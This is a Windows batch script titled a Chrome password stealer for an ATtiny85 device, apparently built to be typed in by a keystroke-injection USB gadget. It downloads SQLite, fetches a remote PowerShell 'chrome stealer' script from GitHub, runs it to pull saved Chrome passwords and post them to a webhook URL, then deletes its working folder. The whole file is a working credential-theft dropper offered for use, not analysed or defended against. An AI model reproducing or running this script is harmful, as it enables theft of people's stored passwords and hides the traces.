@echo off
REM Quick Chrome Password Stealer for ATtiny85
REM Downloads SQLite, installs it, and runs password extraction

set TEMP_DIR=%TEMP%\chrome_stealer
set WEBHOOK_URL=http://localhost:8080

REM Create temp directory
if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%"
cd /d "%TEMP_DIR%"

echo [+] Chrome Password Stealer - ATtiny85 Edition
echo [+] Installing SQLite...

REM Download SQLite from official source
powershell -Command "Invoke-WebRequest -Uri 'https://www.nuget.org/api/v2/package/System.Data.SQLite.Core/1.0.118' -OutFile 'sqlite.zip'"

if exist sqlite.zip (
    echo [+] SQLite downloaded, extracting...
    powershell -Command "Expand-Archive -Path 'sqlite.zip' -DestinationPath 'sqlite_package' -Force"
    
    REM Find and copy SQLite DLL
    for /r sqlite_package %%f in (System.Data.SQLite.dll) do (
        if exist "%%f" (
            copy "%%f" "%TEMP_DIR%\" >nul 2>&1
            echo [+] SQLite DLL installed
            goto :sqlite_ready
        )
    )
    
    echo [-] SQLite DLL not found in package
    goto :no_sqlite
) else (
    echo [-] Failed to download SQLite
    goto :no_sqlite
)

:sqlite_ready
echo [+] Downloading password stealer script...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mrx-arafat/AtTiny85-Gameplay/main/chrome-passwords/simple_chrome_stealer.ps1' -OutFile 'simple_chrome_stealer.ps1'"

if exist simple_chrome_stealer.ps1 (
    echo [+] Script downloaded, starting extraction...

    REM Add SQLite DLL to PowerShell session and run stealer
    powershell -Command "Add-Type -Path '%TEMP_DIR%\System.Data.SQLite.dll'; & '%TEMP_DIR%\simple_chrome_stealer.ps1' -WebhookUrl '%WEBHOOK_URL%'"

    echo [+] Extraction completed
) else (
    echo [-] Failed to download stealer script
)

goto :cleanup

:no_sqlite
echo [!] Running without SQLite (using simple method)
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mrx-arafat/AtTiny85-Gameplay/main/chrome-passwords/simple_chrome_stealer.ps1' -OutFile 'simple_chrome_stealer.ps1'"
if exist simple_chrome_stealer.ps1 (
    powershell -Command "& '%TEMP_DIR%\simple_chrome_stealer.ps1' -WebhookUrl '%WEBHOOK_URL%'"
)

:cleanup
echo [+] Cleaning up...
cd /d %TEMP%
rmdir /s /q "%TEMP_DIR%" >nul 2>&1
echo [+] Done
